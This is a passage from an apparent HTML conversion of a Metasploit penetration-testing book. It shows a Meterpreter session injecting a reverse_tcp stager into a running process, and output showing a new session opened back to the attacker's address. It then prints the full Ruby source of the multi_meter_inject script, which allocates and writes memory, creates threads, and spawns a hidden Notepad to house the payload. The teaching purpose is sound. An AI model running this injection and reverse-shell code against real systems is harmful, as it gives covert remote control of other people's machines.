we need and the shells into which they will be injected.</p><p style="text-indent: 0pt;line-height: 10pt;text-align: right;">Meterpreter executes in memory only. When we inject into a process, we</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">are injecting Meterpreter into the memory space of that process. This allows us to remain stealthy, never reading or writing files to disk, while ultimately having multiple shells available to us.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">We then set the IP address <span class="s32">@ </span>and port number <span class="s32">O </span>on the attacking machine to which we want the new Meterpreter session to connect.</p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">We issue the <span class="s25">ps </span>command within Meterpreter to get a list of running processes:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_635.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">ps</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Process list</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">============</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:92.2596pt" cellspacing="0"><tr style="height:10pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">PID</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:130pt"><p class="s28" style="padding-left: 11pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Arch Session User</p></td><td style="width:58pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">Path</p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">---</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">----</p></td><td style="width:130pt"><p class="s28" style="padding-left: 11pt;text-indent: 0pt;line-height: 9pt;text-align: left;">---- ------- ----</p></td><td style="width:58pt"><p class="s28" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">----</p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[System Process]</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">4</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">System</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">256</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">smss.exe</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">364</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">csrss.exe</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">412</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">wininit.exe</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">424</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">csrss.exe</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">472</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">winlogon.exe</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">516</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">services.exe</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">524</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">lsass.exe</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">532</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">lsm.exe</p></td><td style="width:130pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:10pt"><td style="width:24pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">2808</p></td><td style="width:82pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">iexplorer.exe <span class="s33">O</span></p></td><td style="width:130pt"><p class="s28" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">x86</p></td><td style="width:58pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_636.png"/></span></p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">We’ll inject our new Meterpreter shell into the <span class="s19">iexplorer.exe </span><span class="s32">O </span>process. This will spawn a second Meterpreter console completely within memory and</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">will never write data to the disk.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Let’s run the <span class="s25">multi_meter_inject </span>command using some of the switches we reviewed earlier to see if it works:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_637.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run  multi_meter_inject  -mp  2808  -mr  172.16.32.129  -p  443 </span>[*] Creating a reverse meterpreter stager: LHOST=172.16.32.129 LPORT=443 [*] Injecting meterpreter into process ID 2808</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Allocated memory at address 0x03180000, for 290 byte stager [*] Writing the stager into memory...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (749056 bytes) to 172.16.32.170</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[+] Successfully injected Meterpreter in to process: 2808</p><p class="s30" style="padding-top: 1pt;padding-left: 111pt;text-indent: -33pt;line-height: 72%;text-align: left;">O <span class="s25">[*] Meterpreter session 3 opened (172.16.32.129:443 -&gt; 172.16.32.170:1098) at Tue Nov 30 22:37:29 -0500 2010</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_638.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 84%;text-align: left;">As this output indicates, our command was successful and a new Meter- preter session has been opened, as shown at <span class="s32">O</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Now that you understand what this script can do, let’s examine how it</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">works. We’ll break the script into chunks to help us parse its commands and overall structure.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">First, variables and definitions are defined and the flags we want to pass to Meterpreter are set up:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_639.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"># $Id: multi_meter_inject.rb 10901 2010-11-04 18:42:36Z darkoperator $ # $Revision: 10901 $</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;"># Author: Carlos Perez at carlos_perez[at]darkoperator.com</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"># ################## Variable Declarations ##################</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">@client = client</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">lhost = Rex::Socket.source_address(&quot;1.2.3.4&quot;) lport = 4444</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">lhost = &quot;127.0.0.1&quot;</p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 88%;text-align: left;">O <span class="s25">pid = nil multi_ip = nil multi_pid = []</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">payload_type = &quot;windows/meterpreter/reverse_tcp&quot; start_handler = nil</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8 <span class="s25">@exec_opts = Rex::Parser::Arguments.new(</span></p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&quot;-h&quot; =&gt; [ false, &quot;Help menu.&quot; ],</p><p class="s25" style="padding-left: 145pt;text-indent: -21pt;line-height: 88%;text-align: left;">&quot;-p&quot; =&gt; [ true, &quot;The port on the remote host where Metasploit is listening (default: 4444)&quot;],</p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;text-align: left;">&quot;-m&quot; =&gt; [ false, &quot;Start Exploit multi/handler for return connection&quot;], &quot;-pt&quot; =&gt; [ true, &quot;Specify Reverse Connection Meterpreter Payload.</p><p class="s25" style="padding-left: 145pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Default windows/meterpreter/reverse_tcp&quot;],</p><p class="s25" style="padding-left: 145pt;text-indent: -21pt;line-height: 88%;text-align: left;">&quot;-mr&quot; =&gt; [ true, &quot;Provide Multiple IP Addresses for Connections separated by comma.&quot;],</p><p class="s25" style="padding-left: 145pt;text-indent: -21pt;line-height: 87%;text-align: left;">&quot;-mp&quot; =&gt; [ true, &quot;Provide Multiple PID for connections separated by comma one per IP.&quot;]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meter_type = client.platform</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_640.png"/></span></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: justify;">At the beginning of this section of script, notice that several variables are defined for later use. For example, <span class="s25">pid = nil </span>at <span class="s32">O </span>creates a PID variable but its value is not set. The <span class="s25">@exec_opts = Rex::Parser::Arguments.new( </span>section at <span class="s32">8</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">defines the additional help commands and flags that will be used.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: justify;">The next section defines functions that we will call later:</p><p style="text-indent: 0pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_641.png"/></span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 21pt;text-align: left;">################## Function Declarations ################## # Usage Message Function</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">#<u>                                                                             </u></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">def usage</span></p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 9pt;text-align: justify;">print_line &quot;Meterpreter Script for injecting a reverse tcp Meterpreter Payload&quot;</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;text-align: justify;">print_line &quot;in to memory of multiple PID&#39;s, if none is provided a notepad process.&quot; print_line &quot;will be created and a Meterpreter Payload will be injected in to each.&quot; print_line(@exec_opts.usage)</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">raise Rex::Script::Completed</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"># Wrong Meterpreter Version Message Function</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># def wrong_meter_version(meter = meter_type)</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;text-align: left;">print_error(&quot;#{meter} version of Meterpreter is not supported with this Script!&quot;) raise Rex::Script::Completed</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"># Function for injecting payload in to a given PID</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">#<u>                                                                             </u></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8 <span class="s25">def inject(target_pid, payload_to_inject)</span></p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 9pt;text-align: left;">print_status(&quot;Injecting meterpreter into process ID #{target_pid}&quot;)</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 11pt;text-align: left;">begin</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">host_process = @client.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS) raw = payload_to_inject.generate</p><p class="s30" style="padding-left: 95pt;text-indent: 0pt;line-height: 13pt;text-align: left;">@<span class="s25">mem = host_process.memory.allocate(raw.length + (raw.length % 1024))</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 128pt;text-indent: -25pt;line-height: 87%;text-align: left;">print_status(&quot;Allocated memory at address #{&quot;0x%.8x&quot; % mem}, for #{raw.length} byte stager&quot;)</p><p class="s25" style="padding-top: 1pt;padding-left: 95pt;text-indent: 7pt;line-height: 77%;text-align: left;">print_status(&quot;Writing the stager into memory...&quot;) <span class="s30">O</span>host_process.memory.write(mem, raw) <span class="s30">@</span>host_process.thread.create(mem, 0)</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;line-height: 9pt;text-align: left;">print_good(&quot;Successfully injected Meterpreter in to process: #{target_pid}&quot;)</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 11pt;text-align: left;">rescue::Exception =&gt; e</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">print_error(&quot;Failed to Inject Payload to #{target_pid}!&quot;) print_error(e)</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 10pt;text-align: left;">end</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_642.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">In this example, the function <span class="s25">usage </span>at <span class="s32">O </span>will be called when the <span class="s25">-h </span>flag is set. You can call a number of Meterpreter functions directly from the Meter-</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 84%;text-align: left;">preter API. This functionality simplifies certain tasks, such as injecting into a new process with the <span class="s25">def inject </span>function, as shown at <span class="s32">8</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The next important element is the <span class="s25">host_process.memory.allocate </span>call at <span class="s32">@</span>,</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">which will allow us to allocate memory space for our Meterpreter payload.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 15pt;text-align: justify;">We then write the memory to our process using <span class="s25">host_process.memory.write </span>at <span class="s32">O</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 13pt;text-align: justify;">and create a new thread using <span class="s25">host_process.thread.create </span>at <span class="s32">@</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">Next we define the multi-handler that handles the connections based</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">on the selected payload, as shown in boldface in the following output. (The default is Meterpreter, so the multi-handler will handle Meterpreter sessions unless otherwise specified.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_643.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"># Function for creation of connection handler</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#<u>                                                                               </u></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">def create_multi_handler(payload_to_inject)</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">mul = @client.framework.exploits.create(&quot;multi/handler&quot;) mul.share_datastore(payload_to_inject.datastore) mul.datastore[&#39;WORKSPACE&#39;] = @client.workspace mul.datastore[&#39;PAYLOAD&#39;] = payload_to_inject mul.datastore[&#39;EXITFUNC&#39;] = &#39;process&#39; mul.datastore[&#39;ExitOnSession&#39;] = true print_status(&quot;Running payload handler&quot;) mul.exploit_simple(</p><p class="s25" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">&#39;Payload&#39; =&gt; mul.datastore[&#39;PAYLOAD&#39;], &#39;RunAsJob&#39; =&gt; true</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 11pt;text-align: left;">)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_644.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">The <span class="s25">pay = client.framework.payloads.create(payload) </span>call in the following section allows us to create a payload from the Metasploit Framework. Because we know this is a Meterpreter payload, Metasploit will automatically generate it for us.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_645.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"># Function for Creating the Payload</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># def create_payload(payload_type,lhost,lport)</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">print_status(&quot;Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}&quot;) payload = payload_type</p><p class="s24" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">pay = client.framework.payloads.create(payload) <span class="s25">pay.datastore[&#39;LHOST&#39;] = lhost pay.datastore[&#39;LPORT&#39;] = lport</span></p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 11pt;text-align: left;">return pay</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_646.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The next option spawns a process using Notepad by default. If we didn’t specify a process, it would have created a Notepad process for us automatically.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_647.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"># Function that starts the notepad.exe process</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># def start_proc()</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print_good(&quot;Starting Notepad.exe to house Meterpreter Session.&quot;)</p><p class="s24" style="padding-left: 70pt;text-indent: 0pt;line-height: 10pt;text-align: left;">proc = client.sys.process.execute(&#39;notepad.exe&#39;, nil, {&#39;Hidden&#39; =&gt; true })</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">print_good(&quot;Process created with pid #{proc.pid}&quot;) return proc.pid</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_648.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The boldfaced call lets us execute any command on the operating system. Notice that <span class="s25">Hidden </span>is set to <span class="s25">true</span>. This means that the user on the other side (the target) will not see anything; if Notepad is opened, it will run without the target user’s knowledge.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Next we call our functions, throw if statements, and start the payload:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_649.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">################## Main ##################</p><p class="s25" style="padding-left: 124pt;text-indent: -34pt;text-align: left;">@exec_opts.parse(args) { |opt, idx, val| case opt</p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 10pt;text-align: left;">when &quot;-h&quot;</p><p class="s25" style="padding-left: 124pt;text-indent: 34pt;text-align: left;">usage when &quot;-p&quot;</p><p class="s25" style="padding-left: 124pt;text-indent: 34pt;text-align: left;">lport = val.to_i when &quot;-m&quot;</p><p class="s25" style="padding-left: 124pt;text-indent: 34pt;text-align: left;">start_handler = true when &quot;-pt&quot;</p><p class="s25" style="padding-left: 124pt;text-indent: 34pt;text-align: left;">payload_type = val when &quot;-mr&quot;</p><p class="s25" style="padding-left: 124pt;text-indent: 34pt;text-align: left;">multi_ip = val.split(&quot;,&quot;) when &quot;-mp&quot;</p><p class="s25" style="padding-left: 158pt;text-indent: 0pt;line-height: 11pt;text-align: left;">multi_pid = val.split(&quot;,&quot;)</p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 10pt;text-align: left;">end</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"># Check for Version of Meterpreter wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i # Create a Multi Handler is Desired create_multi_handler(payload_type) if start_handler</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_650.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Finally, we go through a couple of checks, make sure the syntax is correct, and inject our new Meterpreter session into our PID:</p><p style="text-indent: 0pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_651.png"/></span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 21pt;text-align: left;"># Check for a PID or program name if multi_ip</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 10pt;text-align: left;">if multi_pid</p><p class="s25" style="padding-left: 138pt;text-indent: -34pt;text-align: left;">if multi_ip.length == multi_pid.length pid_index = 0</p><p class="s25" style="padding-left: 138pt;text-indent: 0pt;line-height: 11pt;text-align: left;">multi_ip.each do |i|</p><p class="s25" style="padding-left: 172pt;text-indent: 0pt;text-align: left;">payload = create_payload(payload_type,i,lport) inject(multi_pid[pid_index],payload) select(nil, nil, nil, 5)</p><p class="s25" style="padding-left: 172pt;text-indent: 0pt;line-height: 11pt;text-align: left;">pid_index = pid_index + 1</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">else</p><p class="s25" style="padding-left: 14pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 14pt;text-indent: 0pt;line-height: 11pt;text-align: left;">multi_ip.each do |i|</p><p class="s25" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">payload = create_payload(payload_type,i,lport) inject(start_proc,payload)</p><p class="s25" style="padding-left: 48pt;text-indent: 0pt;line-height: 11pt;text-align: left;">select(nil, nil, nil, 2)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="text-indent: 0pt;text-align: right;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">end</p><p class="s25" style="padding-left: 19pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_652.png"/></span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">else end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 14pt;text-indent: 0pt;text-align: left;">print_error(&quot;You must provide at least one IP!&quot;)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-top: 6pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark431">Meterpreter API</a><a name="bookmark441">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">During a penetration test, you might be unable to find an existing script that matches what you need in order to perform a required task. If you under- stand the basic concepts of programming, it should be relatively easy for you to pick up the Ruby syntax and use it to write additional scripts.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Let’s start off with a basic print statement that uses the interactive Ruby shell, also known as <span class="s25">irb</span>. From the Meterpreter console, issue the <span class="s24">irb </span>command and begin typing commands:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_653.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span 